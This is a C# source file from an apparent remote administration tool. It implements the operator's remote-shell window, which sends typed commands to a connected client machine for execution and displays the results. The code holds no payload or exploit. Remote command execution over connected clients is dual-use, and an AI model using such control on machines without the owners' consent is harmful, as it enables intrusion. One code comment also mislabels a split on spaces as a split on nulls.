using Serveur.Controllers.Server;
using Serveur.Packets.ClientPackets;
using Serveur.Packets.ServerPackets;
using System;
using System.Drawing;
using System.Windows.Forms;

namespace Serveur.Controllers
{
    public class FrmRemoteShellController
    {
        private static ClientMosaic _client;

        public FrmRemoteShellController(ClientMosaic client)
        {
           _client = client;
        }

        public static void getShellCmdExecuteResponse(ClientMosaic client, GetExecuteShellCmdResponse packet)
        {
            if (client.value == null || client.value.frmRms == null)
                return;

            if(packet.isError)
                printError(packet.output);
            else
                printMessage(packet.output);
        }   

        public void remoteShellKeyDown()
        {
            string input = _client.value.frmRms.txtConsoleInput.Text.TrimStart(' ').TrimEnd(' ');
            _client.value.frmRms.txtConsoleInput.Text = string.Empty;

            // Split based on the space key.
            string[] splitSpaceInput = input.Split(' ');
            // Split based on the null key.
            string[] splitNullInput = input.Split(' ');

            if(input =="exit" || ((splitSpaceInput.Length > 0) && splitSpaceInput[0] == "exit")
                || ((splitNullInput.Length > 0) && splitNullInput[0] == "exit")){
                _client.value.frmRms.Close();
            }
            else
            {
                switch (input)
                {
                    case "cls":
                        _client.value.frmRms.txtConsoleOutput.Text = string.Empty;
                        break;
                    default:
                        new GetExecuteShellCmd(input).Execute(_client);
                        break;
                }
            }
        }

        public static void printError(string errorMessage)
        {
            try
            {
                _client.value.frmRms.txtConsoleOutput.Invoke((MethodInvoker)delegate
                {
                    _client.value.frmRms.txtConsoleOutput.SelectionColor = Color.Red;
                    _client.value.frmRms.txtConsoleOutput.AppendText(errorMessage);
                });
            }
            catch (InvalidOperationException)
            {

            }
        }

        public static void printMessage(string message)
        {
            try
            {
                _client.value.frmRms.txtConsoleOutput.Invoke((MethodInvoker)delegate
                {
                    _client.value.frmRms.txtConsoleOutput.SelectionColor = Color.LightGreen;
                    _client.value.frmRms.txtConsoleOutput.AppendText(message);
                });
            }
            catch (InvalidOperationException)
            {
            }
        }
    }
}
